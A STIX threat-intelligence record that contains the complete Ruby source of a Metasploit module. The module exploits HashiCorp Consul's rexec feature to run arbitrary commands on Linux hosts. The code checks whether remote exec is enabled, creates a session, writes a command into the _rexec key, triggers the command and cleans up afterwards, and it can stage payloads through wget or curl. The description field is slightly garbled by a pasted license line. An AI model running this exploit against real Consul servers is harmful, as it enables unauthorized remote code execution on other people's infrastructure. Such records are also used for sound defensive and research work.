{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b7497b7-43d8-4647-97ea-44b2a5265fbb",
    "created": "2024-08-14T17:06:51.570592Z",
    "modified": "2024-08-14T17:06:51.570596Z",
    "name": "\"Hashicorp Consul Remote Command Execution via Rexec\"",
    "description": " This module exploits a feature of Hashicorp Consul named rexec.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/consul_rexec_exec.rb",
            "external_id": "consul_rexec_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.consul.io/docs/agent/options.html#disable_remote_exec"
        },
        {
            "source_name": "reference",
            "url": "https://www.consul.io/docs/commands/exec.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/torque59/Garfield"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Hashicorp Consul Remote Command Execution via Rexec\",\n      'Description'    => %q{\n        This module exploits a feature of Hashicorp Consul named rexec.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Bharadwaj Machiraju <bharadwaj.machiraju[at]gmail.com>', # Discovery and PoC\n          'Francis Alexander <helofrancis[at]gmail.com>', # Discovery and PoC\n          'Quentin Kaiser <kaiserquentin[at]gmail.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'https://www.consul.io/docs/agent/options.html#disable_remote_exec' ],\n          [ 'URL', 'https://www.consul.io/docs/commands/exec.html'],\n          [ 'URL', 'https://github.com/torque59/Garfield' ]\n        ],\n      'Platform'        => 'linux',\n      'Targets'         => [ [ 'Linux', {} ] ],\n      'Payload'         => {},\n      'CmdStagerFlavor' => [ 'bourne', 'echo', 'printf', 'wget', 'curl' ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-08-11'))\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path', '/']),\n        OptBool.new('SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]),\n        OptInt.new('TIMEOUT', [false, 'The timeout to use when waiting for the command to trigger', 20]),\n        OptString.new('ACL_TOKEN', [false, 'Consul Agent ACL token', '']),\n        Opt::RPORT(8500)\n      ])\n  end\n\n  def check\n    uri = target_uri.path\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri' => normalize_uri(uri, \"/v1/agent/self\"),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      }\n    })\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n    begin\n      agent_info = JSON.parse(res.body)\n      if agent_info[\"Config\"][\"DisableRemoteExec\"] == false || agent_info[\"DebugConfig\"][\"DisableRemoteExec\"] == false\n        return CheckCode::Vulnerable\n      else\n        return CheckCode::Safe\n      end\n    rescue JSON::ParserError\n      vprint_error 'Failed to parse JSON output.'\n      return CheckCode::Unknown\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    uri = target_uri.path\n\n    print_status('Creating session.')\n    res = send_request_cgi({\n      'method' => 'PUT',\n      'uri' => normalize_uri(uri, 'v1/session/create'),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      },\n      'ctype' => 'application/json',\n      'data' => {:Behavior => \"delete\", :Name => \"Remote Exec\", :TTL => \"15s\"}.to_json\n    })\n\n    if res and res.code == 200\n      begin\n        sess = JSON.parse(res.body)\n        print_status(\"Got rexec session ID #{sess['ID']}\")\n      rescue JSON::ParseError\n        fail_with(Failure::Unknown, 'Failed to parse JSON output.')\n      end\n    end\n\n    print_status(\"Setting command for rexec session #{sess['ID']}\")\n    res = send_request_cgi({\n      'method' => 'PUT',\n      'uri' => normalize_uri(uri, \"v1/kv/_rexec/#{sess['ID']}/job?acquire=#{sess['ID']}\"),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      },\n      'ctype' => 'application/json',\n      'data' => {:Command => \"#{cmd}\", :Wait => 2000000000}.to_json\n    })\n    if res and not res.code == 200 or res.body == 'false'\n      fail_with(Failure::Unknown, 'An error occured when contacting the Consul API.')\n    end\n\n    print_status(\"Triggering execution on rexec session #{sess['ID']}\")\n    res = send_request_cgi({\n      'method' => 'PUT',\n      'uri' => normalize_uri(uri, \"v1/event/fire/_rexec\"),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      },\n      'ctype' => 'application/json',\n      'data' => {:Prefix => \"_rexec\", :Session => \"#{sess['ID']}\"}.to_json\n    })\n    if res and not res.code == 200\n      fail_with(Failure::Unknown, 'An error occured when contacting the Consul API.')\n    end\n\n    begin\n      Timeout.timeout(datastore['TIMEOUT']) do\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => normalize_uri(uri, \"v1/kv/_rexec/#{sess['ID']}/?keys=&wait=2000ms\"),\n          'headers' => {\n            'X-Consul-Token' => datastore['ACL_TOKEN']\n          }\n        })\n        begin\n          data = JSON.parse(res.body)\n          break if data.include? 'out'\n        rescue JSON::ParseError\n          fail_with(Failure::Unknown, 'Failed to parse JSON output.')\n        end\n        sleep 2\n      end\n    rescue Timeout::Error\n      # we catch this error so cleanup still happen afterwards\n      print_status(\"Timeout hit, error with payload ?\")\n    end\n\n    print_status(\"Cleaning up rexec session #{sess['ID']}\")\n    res = send_request_cgi({\n      'method' => 'PUT',\n      'uri' => normalize_uri(uri, \"v1/session/destroy/#{sess['ID']}\"),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      }\n    })\n\n    if res and not res.code == 200 or res.body == 'false'\n      fail_with(Failure::Unknown, 'An error occured when contacting the Consul API.')\n    end\n\n    res = send_request_cgi({\n      'method' => 'DELETE',\n      'uri' => normalize_uri(uri, \"v1/kv/_rexec/#{sess['ID']}?recurse=\"),\n      'headers' => {\n        'X-Consul-Token' => datastore['ACL_TOKEN']\n      }\n    })\n\n    if res and not res.code == 200 or res.body == 'false'\n      fail_with(Failure::Unknown, 'An error occured when contacting the Consul API.')\n    end\n  end\n\n  def exploit\n    execute_cmdstager()\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-08-11",
    "x_mitre_platforms": [
        "linux'"
    ]
}